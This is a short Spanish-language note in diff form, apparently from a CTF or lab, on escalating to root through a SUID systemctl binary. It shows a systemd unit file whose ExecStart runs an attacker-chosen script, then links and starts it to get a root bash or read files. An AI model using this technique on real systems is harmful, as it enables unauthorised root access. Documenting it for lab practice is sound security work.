@@ -1,0 +1,19 @@
+si tenemos permiso para ejecutar systemctl y tiene el permiso de s siendo root el propietario, vamos a crear un servicio que invoque el script que queremos:
+#el exec tiene que apuntar a nuestro script
+#tienes que linkear el systemctl al servicio : systemctl link /ruta
+
+servici.service
+[Unit]
+Description=" espero que no sea alérgico"
+
+[Service]
+Type=oneshot
+ExecStart=/home/pepper/x.sh
+
+
+[Install]
+WantedBy=multi-user.target
+
+systemctl start service.service# y ale
+
+#esto va a tener un enlace sinvólico a un script, que puede tirar una bash, hacer un cat o cualquier cosa que nos la ponga dura como un camión.
